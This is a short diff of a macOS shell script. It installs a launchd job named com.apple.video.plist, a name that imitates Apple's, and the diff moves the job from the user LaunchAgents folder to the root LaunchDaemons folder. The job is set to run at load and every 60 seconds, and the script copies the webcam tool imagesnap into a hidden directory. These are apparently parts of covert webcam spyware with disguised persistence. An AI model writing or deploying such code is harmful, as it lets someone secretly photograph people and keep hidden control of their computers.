@@ -37,17 +37,17 @@ echo '
     <key>RunAtLoad</key>
         <true/>
     <key>StartInterval</key>
-        <integer>0</integer>
+        <integer>60</integer>
     <key>AbandonProcessGroup</key>
         <true/>
     </dict>
 </plist>
-' > /Library/LaunchAgents/com.apple.video.plist
-#' > /Library/LaunchDaemons/com.apple.video.plist
-chown root:wheel /Library/LaunchAgents/com.apple.video.plist
-chmod 0644 /Library/LaunchAgents/com.apple.video.plist
+' > /Library/LaunchDaemons/com.apple.video.plist
+#' > /Library/LaunchAgents/com.apple.video.plist
+chown root:wheel /Library/LaunchDaemons/com.apple.video.plist
+chmod 0644 /Library/LaunchDaemons/com.apple.video.plist
 #Load the LaunchAgent
-launchctl load -w /Library/LaunchAgents/com.apple.video.plist
+launchctl load -w /Library/LaunchDaemons/com.apple.video.plist
 
 #Copy imagesnap to the hidden directory
 cp imagesnap $HOME/.hidden
